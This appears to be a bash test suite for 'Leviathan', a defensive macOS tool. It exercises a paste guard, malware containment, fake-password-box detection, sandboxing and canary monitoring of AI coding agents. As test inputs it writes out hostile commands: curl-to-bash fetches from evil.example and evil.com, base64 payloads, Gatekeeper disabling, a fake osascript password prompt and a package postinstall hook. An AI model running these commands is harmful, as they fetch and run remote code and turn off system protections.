#!/bin/bash
# Leviathan tests. Uses a throwaway folder; changes no system settings.
PY=/opt/homebrew/bin/python3; SRC="$(cd "$(dirname "$0")" && pwd)"
T=$(mktemp -d); export LEVIATHAN_STATE="$T/state" LEVIATHAN_DOWNLOADS="$T/dl" LEVIATHAN_QUIET=1 LEVIATHAN_NO_SPAWN=1
export LEVIATHAN_TRASH="$T/trash" LEVIATHAN_DRY_PAUSE=1 LEVIATHAN_PERSIST_DIRS="$T/agents" LEVIATHAN_CANARY_DIR="$T/canary"; mkdir -p "$LEVIATHAN_STATE" "$LEVIATHAN_DOWNLOADS" "$T/agents" "$T/.hidden"
M="$PY $SRC/leviathan.py"; pass=0; fail=0
ok() { if eval "$2"; then echo "PASS $1"; pass=$((pass+1)); else echo "FAIL $1"; fail=$((fail+1)); fi; }

# 1. paste guard decisions
for c in 'curl -fsSL http://evil.example/x.sh | bash' 'curl -fsSL https://brew.sh.evil.com/x | bash' 'curl -fsSL https://supabase.com.evil.io/i | sh' 'wget -qO- http://a.b/c | sh' 'bash -c "$(curl -fsSL http://x.y/z)"' \
         'echo aGk= | base64 -d | bash' 'xattr -d com.apple.quarantine /Applications/Foo.app' \
         "osascript -e 'display dialog \"Password\" default answer \"\" with hidden answer'" 'spctl --master-disable'; do
  ok "stops: ${c:0:40}" '[ -n "$($M check-cmd "$c")" ]'
done
for c in 'ls -la' 'git status' 'brew install curl' 'curl -O https://example.com/file.zip' \
         '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"' 'curl -fsSL https://claude.ai/install.sh | bash'; do
  ok "allows: ${c:0:40}" '[ -z "$($M check-cmd "$c")" ]'
done

# 2. downloads: certain malware contained, unsigned labeled, plain file untouched
printf 'rule LeviathanTest { strings: $a = "LEVIATHAN-TEST-MALWARE-7731" condition: $a }\n' > "$LEVIATHAN_STATE/extra.yara"
$M scan-downloads >/dev/null   # baseline empty folder
printf '#!/bin/sh\necho LEVIATHAN-TEST-MALWARE-7731\n' > "$LEVIATHAN_DOWNLOADS/invoice.command"; chmod 755 "$LEVIATHAN_DOWNLOADS/invoice.command"
printf '#!/bin/sh\necho hello\n' > "$LEVIATHAN_DOWNLOADS/tool.command"; chmod 755 "$LEVIATHAN_DOWNLOADS/tool.command"
echo "notes" > "$LEVIATHAN_DOWNLOADS/notes.txt"
$M scan-downloads >/dev/null
ok "malware moved out of Downloads" '[ ! -e "$LEVIATHAN_DOWNLOADS/invoice.command" ]'
ok "malware moved to the Trash and can't run there" '[ -e "$T/trash/invoice.command" ] && [ ! -x "$T/trash/invoice.command" ]'
ok "unsigned script left alone, no label" '[ -x "$LEVIATHAN_DOWNLOADS/tool.command" ] && ! xattr -p com.apple.metadata:_kMDItemUserTags "$LEVIATHAN_DOWNLOADS/tool.command" >/dev/null 2>&1'
ok "unsigned script only noted in the private log" 'grep -q "\"noticed\".*tool.command" "$LEVIATHAN_STATE/ledger.jsonl"'
ok "log is private (mode 600)" '[ "$(stat -f %Lp "$LEVIATHAN_STATE/ledger.jsonl")" = 600 ]'
ok "plain file untouched" '[ -e "$LEVIATHAN_DOWNLOADS/notes.txt" ] && ! xattr -p com.apple.metadata:_kMDItemUserTags "$LEVIATHAN_DOWNLOADS/notes.txt" >/dev/null 2>&1'
ID=$(grep '"contained"' "$LEVIATHAN_STATE/ledger.jsonl" | head -1 | $PY -c 'import json,sys;print(json.loads(sys.stdin.read())["id"])')
$M undo "$ID" >/dev/null
ok "undo puts it back runnable" '[ -x "$LEVIATHAN_DOWNLOADS/invoice.command" ]'

# 2b. full scan finds malware in an app and reports it, changing nothing
mkdir -p "$T/apps/Fake.app/Contents/MacOS"; printf 'LEVIATHAN-TEST-MALWARE-7731' > "$T/apps/Fake.app/Contents/MacOS/Fake"
mkdir -p "$T/apps/Clean.app/Contents/MacOS"; printf 'hello' > "$T/apps/Clean.app/Contents/MacOS/Clean"
SC=$(LEVIATHAN_APP_DIRS="$T/apps" $M scan 2>&1); RC=$?
ok "scan reports the infected app" 'echo "$SC" | grep -q "Fake.app: matches" && [ $RC = 1 ]'
ok "scan does not report the clean app" '! echo "$SC" | grep -q "Clean.app"'
ok "scan changes nothing" '[ -e "$T/apps/Fake.app/Contents/MacOS/Fake" ]'
ok "bad undo number is refused politely" '$M undo abc | grep -q "Use the number"'

# 2c. check answers "is this a virus?"; quarantine deletes itself after 7 days
printf 'LEVIATHAN-TEST-MALWARE-7731' > "$T/bad.bin"; printf 'hello' > "$T/plain.txt"
ok "check flags malware" '$M check "$T/bad.bin" | grep -q "Likely malware"; [ ${PIPESTATUS[0]} = 1 ]'
ok "check passes a plain file and says what it can miss" '$M check "$T/plain.txt" | grep -q "can still pass"'
ok "check --contain removes malware (flag first)" '$M check --contain "$T/bad.bin" >/dev/null; [ ! -e "$T/bad.bin" ]'
Q="$LEVIATHAN_STATE/quarantine"; mkdir -p "$Q"; printf x > "$Q/20200101-000000-old.bin"; printf x > "$Q/$(date +%Y%m%d-%H%M%S)-new.bin"; printf x > "$Q/notours.bin"
$M purge >/dev/null
ok "purge deletes items older than 7 days" '[ ! -e "$Q/20200101-000000-old.bin" ]'
ok "purge keeps recent items" 'ls "$Q" | grep -q -- "-new.bin"'
ok "purge leaves files it did not make" '[ -e "$Q/notours.bin" ]'
ok "purge is logged" 'grep -q "\"deleted\"" "$LEVIATHAN_STATE/ledger.jsonl"'
printf x > "$T/gone.txt"; $M contain "$T/gone.txt" >/dev/null; rm -f "$T/trash/gone.txt"
GID=$(grep '"contained"' "$LEVIATHAN_STATE/ledger.jsonl" | tail -1 | $PY -c 'import json,sys;print(json.loads(sys.stdin.read())["id"])')
ok "undo after deletion explains instead of crashing" '$M undo "$GID" | grep -q "no longer in the Trash"'

# 3. auto-start: fake Apple job with unsigned hidden program is contained
printf 'int main(){return 0;}' > "$T/a.c"; clang -o "$T/.hidden/trustd" "$T/a.c" 2>/dev/null && codesign --remove-signature "$T/.hidden/trustd"
cat > "$T/agents/com.apple.trustd.helper.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>Label</key><string>com.apple.trustd.helper</string>
<key>ProgramArguments</key><array><string>$T/.hidden/trustd</string></array></dict></plist>
EOF
$M scan-persist >/dev/null
ok "fake auto-start removed" '[ ! -e "$T/agents/com.apple.trustd.helper.plist" ]'

# 4. fake password box killed
start_ts=$(date +%s); echo $((start_ts+8)) > "$LEVIATHAN_STATE/pwwatch.until"
(exec -a "osascript -e display dialog Password with hidden answer" sleep 30) & FAKE=$!
( $M pwwatch ) & W=$!; sleep 4
ok "fake password box stopped" '! kill -0 $FAKE 2>/dev/null'
kill $W 2>/dev/null; kill $FAKE 2>/dev/null

# 5. bash paste guard blocks in a real interactive shell
sed "s%__PY__%$PY%" "$SRC/guard.bash" > "$T/guard.bash"; mkdir -p "$T/home/.leviathan/bin"; cp "$SRC/leviathan.py" "$T/home/.leviathan/bin/"
OUT=$(printf 'echo first\ncurl -s http://leviathan-test.invalid/x.sh | bash\necho after\n' | HOME="$T/home" bash --rcfile "$T/guard.bash" -i 2>&1)
ok "bash guard stops the paste" 'echo "$OUT" | grep -q "Leviathan stopped this command"'
ok "bash guard keeps normal commands working" 'echo "$OUT" | grep -q "^after\|after$"'

# 6. ledger tamper detection
ok "ledger verifies" '$M verify >/dev/null'
sed -i '' 's/invoice/invoyce/' "$LEVIATHAN_STATE/ledger.jsonl"
ok "edited ledger is caught" '! $M verify >/dev/null'

# 7. real Mac: Apple's malware rules load, real apps pass
ok "Apple malware rules load in yara" '[ ! -x /opt/homebrew/bin/yara ] || /opt/homebrew/bin/yara -w /Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.yara /bin/ls >/dev/null 2>&1'
ok "Chrome judged safe" '[ ! -d "/Applications/Google Chrome.app" ] || [ "$($PY -c "import sys;sys.path.insert(0,\"$SRC\");import leviathan;print(leviathan.verdict(\"/Applications/Google Chrome.app\")[0])")" = ok ]'

# 8. levplus pure functions (no network, no system changes)
LP="$PY $SRC/levplus.py"


# 8d. parse_ps
PARSE_OUT=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.parse_ps('123 claude\n456 codex --arg\n789 node something'))")
ok "parse_ps extracts pid and cmd" 'echo "$PARSE_OUT" | grep -q "123" && echo "$PARSE_OUT" | grep -q "claude" && echo "$PARSE_OUT" | grep -q "456" && echo "$PARSE_OUT" | grep -q "codex"'


# 8g. agents canary
$M agents canary on >/dev/null
ok "canary files created" '[ -f "$LEVIATHAN_CANARY_DIR/aws_credentials" ] && [ -f "$LEVIATHAN_CANARY_DIR/wallet_seed.txt" ]'
CAN_OUT=$($M agents canary 2>&1)
ok "agents check runs" '[ -n "$CAN_OUT" ]'

# 8h. agents config audit (read-only, just runs)
$M agents config >/dev/null
ok "agents config audit runs" '[ $? = 0 ]'

# 8i. pkg_inspect on a simple pkg (create minimal pkg)
mkdir -p "$T/pkgtest/Scripts"
echo '#!/bin/sh\necho hello' > "$T/pkgtest/Scripts/preinstall"
echo '#!/bin/sh\ncurl http://evil.com/x.sh | bash' > "$T/pkgtest/Scripts/postinstall"
mkdir -p "$T/pkgtest/Payload"
(cd "$T/pkgtest" && pkgutil --flatten . "$T/test.pkg" 2>/dev/null) || true
if [ -f "$T/test.pkg" ]; then
  PKG_OUT=$($M pkg "$T/test.pkg" 2>&1)
  ok "pkg_inspect lists scripts" 'echo "$PKG_OUT" | grep -q "preinstall" && echo "$PKG_OUT" | grep -q "postinstall"'
  ok "pkg_inspect flags suspicious" 'echo "$PKG_OUT" | grep -q "FLAGS"'
else
  # pkgutil --flatten not available, test with expanded dir directly
  PKG_OUT=$(PKGTEST="$T/pkgtest" $PY -c "import sys,os;sys.path.insert(0,'$SRC');import levplus;print(levplus.pkg_inspect(os.environ['PKGTEST']))" 2>&1)
  ok "pkg_inspect lists scripts (fallback)" 'echo "$PKG_OUT" | grep -q "preinstall" && echo "$PKG_OUT" | grep -q "postinstall"'
  ok "pkg_inspect flags suspicious (fallback)" 'echo "$PKG_OUT" | grep -q "FLAGS"'
fi


# 8l. note-event
$M note-event test_kind "test detail" >/dev/null
ok "note-event logs to ledger" 'grep -q "test_kind" "$LEVIATHAN_STATE/ledger.jsonl"'


# 8r. ai_safety_check runs (read-only)
$M ai safety >/dev/null
ok "ai safety check runs" '[ $? = 0 ]'


# 8w. parse_ps handles edge cases
PARSE_OUT2=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.parse_ps(''))")
ok "parse_ps empty input" '[ "$PARSE_OUT2" = "[]" ]'
PARSE_OUT3=$($PY -c "import sys;sys.path.insert(0,'$SRC');import levplus;print(levplus.parse_ps('123 cmd\ninvalid'))")
ok "parse_ps skips invalid" 'echo "$PARSE_OUT3" | grep -q "123"'


# 8z. AI safety fixes (2.0.5)
lp() { $PY -c "import sys; sys.path.insert(0,\"$SRC\"); import levplus as P; print($1)"; }
ok "bypass: current key found" "[ \"\$(lp 'bool(P.claude_bypass({\"permissions\":{\"defaultMode\":\"bypassPermissions\"}}))')\" = True ]"
ok "bypass: old key found" "[ \"\$(lp 'bool(P.claude_bypass({\"bypassPermissions\":True}))')\" = True ]"
ok "bypass: normal mode clean" "[ \"\$(lp 'bool(P.claude_bypass({\"permissions\":{\"defaultMode\":\"default\"}}))')\" = False ]"
ok "bypass: junk input clean" "[ \"\$(lp 'bool(P.claude_bypass([]))')\" = False ]"
ok "codex: full access found" "[ \"\$(lp 'bool(P.codex_full_access(\"approval_policy = \\\"never\\\"\"))')\" = True ]"
ok "codex: on-request clean" "[ \"\$(lp 'bool(P.codex_full_access(\"approval_policy = \\\"on-request\\\"\"))')\" = False ]"
$M agents canary on >/dev/null
sleep 2; cat "$LEVIATHAN_CANARY_DIR/wallet_seed.txt" >/dev/null
ok "decoy read detected" '$M agents canary | grep -q "wallet_seed.txt was read"'
ok "decoy read reported once" '! $M agents canary | grep -q "wallet_seed.txt was read"'
ok "monitor idle while mode off" '$M agents monitor | grep -q "mode is off"'
$M mode agents on >/dev/null
ok "monitor runs with mode on" '$M agents monitor >/dev/null 2>&1'
ok "monitor second run (crontab compare) runs" '$M agents monitor >/dev/null 2>&1'
$M mode agents off >/dev/null
MH=$(mktemp -d); mkdir -p "$MH/.claude"; echo '{"mcpServers":{"a":{"command":"x"}},"projects":{"/p/proj":{"mcpServers":{"b":{"command":"y"}}}}}' > "$MH/.claude.json"
ok "mcp: finds servers in .claude.json and projects" "[ \"$(lp "sorted(P.claude_mcp_servers('$MH'))")\" = \"['claude:a', 'claude:proj/b']\" ]"

# 8z2. 2.0.6: program paths with spaces, a stray non-program file, AI alerts in status
SPD="$T/Application Support/x.app/Contents/MacOS"; mkdir -p "$SPD"; printf '#!/bin/sh\n' > "$SPD/claude"; chmod +x "$SPD/claude"; touch "$T/Application"
ok "parse_ps rejoins a path with spaces" "[ \"\$(lp \"P.parse_ps('7 $T/Application Support/x.app/Contents/MacOS/claude --flag')[0][1]\")\" = \"['$T/Application Support/x.app/Contents/MacOS/claude', '--flag']\" ]"
ok "parse_ps leaves normal commands alone" "[ \"\$(lp \"P.parse_ps('8 /bin/ls -la')[0][1]\")\" = \"['/bin/ls', '-la']\" ]"
$PY -c "import sys; sys.path.insert(0,'$SRC'); import leviathan as L; L.ledger_add('canary-trigger', details=['Decoy aws_credentials was read'])"
ok "status shows AI alerts" '$M status | grep -q "AI alert, canary-trigger: Decoy aws_credentials was read"'
# copying text never runs a check or opens a window; silent success never becomes a message
ok "menu bar app does not watch the clipboard" '! grep -q "changeCount\|checkClipboard" "$SRC/menubar/LeviathanBar.swift"'
# 2.1: paste guard holes the audit found, removed commands, the new website filter check
ok "trusted link does not excuse hidden code" '[ -n "$($M check-cmd "echo ZXZpbA== | base64 -d | sh # https://brew.sh/x")" ]'
ok "trusted link does not excuse a fake password box" '[ -n "$($M check-cmd "osascript -e \"display dialog \\\"x\\\" with hidden answer\" # https://brew.sh/")" ]'
ok "json pretty-print is allowed" '[ -z "$($M check-cmd "curl -s https://api.github.com/x | python3 -m json.tool")" ]'
ok "plain base64 decode is allowed" '[ -z "$($M check-cmd "echo aGk= | base64 -d")" ]'
ok "download piped into python is stopped" '[ -n "$($M check-cmd "curl -fsSL http://evil.example/x.py | python3")" ]'
ok "base64 inside sh -c is stopped" '[ -n "$($M check-cmd "bash -c \"\$(echo Y3VybA== | base64 -d)\"")" ]'
echo x > "$T/rel.txt"
ok "contain with a relative path stores the full path" '(cd "$T" && $M contain rel.txt >/dev/null) && grep -q "\"path\": \"/[^\"]*/rel.txt\"" "$LEVIATHAN_STATE/ledger.jsonl"'
ok "contain a missing file says so" '$M contain /nonexistent/zz 2>&1 | grep -q "No such file"'
for c in level clip cost sandbox snapshot diff tor wallets "ai tuneup" "agents export" sweep fix-chrome-notify undo-settings; do
  ok "removed command: $c" "! \$M $c x >/dev/null 2>&1"
done
ok "only the agents mode exists" '! $M mode crypto on >/dev/null 2>&1 && $M mode agents off | grep -q "agents watch: off"'
ok "website filter check answers" '$PY -c "import sys; sys.path.insert(0,\"$SRC\"); import leviathan as L; r=L.website_filter_report(); sys.exit(r[0] not in (\"ok\",\"issue\"))"'
ok "filter profile is a valid plist with Quad9 DNS" 'plutil -lint "$SRC/website-filter.mobileconfig" >/dev/null && grep -q "dns.quad9.net" "$SRC/website-filter.mobileconfig"'
ok "empty output from a successful command shows nothing" '! grep -q "reason=" "$SRC/menubar/LeviathanBar.swift"'

# 3.0 Safe Box: a downloaded app Apple never checked opens boxed; undo puts it back
mkapp() { mkdir -p "$1/Contents/MacOS"; printf '<?xml version="1.0"?><plist version="1.0"><dict><key>CFBundleExecutable</key><string>x</string></dict></plist>' > "$1/Contents/Info.plist"; printf '#!/bin/sh\nsleep 1\n' > "$1/Contents/MacOS/x"; chmod +x "$1/Contents/MacOS/x"; }
mkapp "$T/dl/Cracked.app"; xattr -w com.apple.quarantine "0081;0;Safari;" "$T/dl/Cracked.app"; mkapp "$T/dl/Mine.app"
$M scan-downloads >/dev/null
ok "downloaded unsigned app is put in the Safe Box" '[ -x "$T/dl/Cracked.app/Contents/MacOS/leviathan-safebox" ] && [ -d "$LEVIATHAN_STATE/safebox/Cracked/app/Cracked.app" ]'
ok "an app you made yourself is left alone" '[ -x "$T/dl/Mine.app/Contents/MacOS/x" ]'
ok "launcher points at the boxed app" 'grep -q "safebox open --exec .*Cracked/app/Cracked.app" "$T/dl/Cracked.app/Contents/Resources/run.sh"'
SBID=$(grep '"safeboxed"' "$LEVIATHAN_STATE/ledger.jsonl" | tail -1 | $PY -c "import json,sys; print(json.loads(sys.stdin.read())['id'])")
$M undo "$SBID" >/dev/null
ok "undo takes the app out of the Safe Box" '[ -x "$T/dl/Cracked.app/Contents/MacOS/x" ] && [ ! -e "$T/dl/Cracked.app/Contents/MacOS/leviathan-safebox" ]'
mkdir -p "$T/box"; $PY -c "import sys; sys.path.insert(0,'$SRC'); import leviathan as L; open('$T/sb.sb','w').write(L.safebox_profile(L.HOME, '$T/box', '$T/dl/Mine.app'))"
ok "Safe Box: your home folder and SSH keys are closed" '! /usr/bin/sandbox-exec -f "$T/sb.sb" /bin/ls "$HOME/.ssh" >/dev/null 2>&1 && ! /usr/bin/sandbox-exec -f "$T/sb.sb" /bin/cat "$HOME/.zshrc" >/dev/null 2>&1'
ok "Safe Box: password boxes and the keychain tool are blocked" '! /usr/bin/sandbox-exec -f "$T/sb.sb" /usr/bin/osascript -e 1 >/dev/null 2>&1 && ! /usr/bin/sandbox-exec -f "$T/sb.sb" /usr/bin/security list-keychains >/dev/null 2>&1'
ok "Safe Box: the app can use its own folder" '/usr/bin/sandbox-exec -f "$T/sb.sb" /usr/bin/touch "$T/box/ok"'

# 3.0 VPN: driven through a stand-in warp-cli that records what it is told
mkdir -p "$T/bin"
cat > "$T/bin/warp-cli" <<EOF
#!/bin/sh
shift
echo "\$*" >> "$T/warp.log"
case "\$1" in
  status) if [ -f "$T/warp.on" ]; then echo "Status update: Connected"; else echo "Status update: Disconnected"; fi;;
  connect) touch "$T/warp.on";;
  disconnect) rm -f "$T/warp.on";;
  registration) [ "\$2" = show ] && exit 1;;
esac
exit 0
EOF
chmod +x "$T/bin/warp-cli"
V() { PATH="$T/bin:$PATH" $M vpn "$@"; }
V auto >/dev/null
ok "VPN connects on a network you have not trusted" '[ -f "$T/warp.on" ] && grep -q "registration new" "$T/warp.log"'
ok "VPN keeps legal sites open (no Cloudflare family filter)" 'grep -q "dns families off" "$T/warp.log"'
V trust >/dev/null
ok "VPN turns off on a trusted network" '[ ! -f "$T/warp.on" ]'
V untrust >/dev/null; V off >/dev/null
ok "VPN off stays off" '[ ! -f "$T/warp.on" ] && grep -q "\"mode\": \"off\"" "$LEVIATHAN_STATE/vpn.json"'
ok "VPN status without WARP says how to install it" 'PATH=/usr/bin:/bin $M vpn status | grep -q "brew install --cask cloudflare-warp"'

# 3.0 AI safety: tripwire, report, agent box
ok "decoy carries the planted instruction" '$M agents canary on >/dev/null && grep -q "leviathan agents tripped" "$T/canary/aws_credentials"'
ok "tripwire runs and never freezes during tests" '$M agents tripped | grep -q "would be paused\|no AI agent started"'
ok "report shares events with your home folder hidden" '! $M agents report --jsonl | grep -q "$HOME/"'
mkdir -p "$T/proj"
ok "agent box: project is writable" '(cd "$T/proj" && $M agents run -- /usr/bin/touch made.txt) && [ -f "$T/proj/made.txt" ]'
ok "agent box: SSH keys and Documents are closed" '(cd "$T/proj" && ! $M agents run -- /bin/ls "$HOME/.ssh" >/dev/null 2>&1 && ! $M agents run -- /bin/ls "$HOME/Documents" >/dev/null 2>&1)'

# agent matching
am() { $PY -c "import sys; sys.path.insert(0,\"$SRC\"); import levplus as P; print(bool(P._is_agent_process(sys.argv[1:])))" "$@"; }
ok "agent: claude cli" "[ \"\$(am /Users/x/.local/bin/claude -p hi)\" = True ]"
ok "agent: codex via node" "[ \"\$(am node /usr/local/bin/codex)\" = True ]"
ok "agent: desktop claude code" "[ \"\$(am /Users/x/Lib/Claude/claude-code/2.1/x/claude.app/Contents/MacOS/claude)\" = True ]"
ok "not agent: Claude desktop app" "[ \"\$(am /Applications/Claude.app/Contents/MacOS/Claude)\" = False ]"
ok "not agent: zsh" "[ \"\$(am -zsh)\" = False ]"
ok "not agent: vim cursor.txt" "[ \"\$(am vim cursor.txt)\" = False ]"
ok "agent: python agent via Homebrew Python.app" "[ \"\$(am /opt/homebrew/Frameworks/Python.framework/Versions/3.15/Resources/Python.app/Contents/MacOS/Python /usr/local/bin/aider)\" = True ]"
echo; echo "$pass passed, $fail failed"; rm -rf "$T"
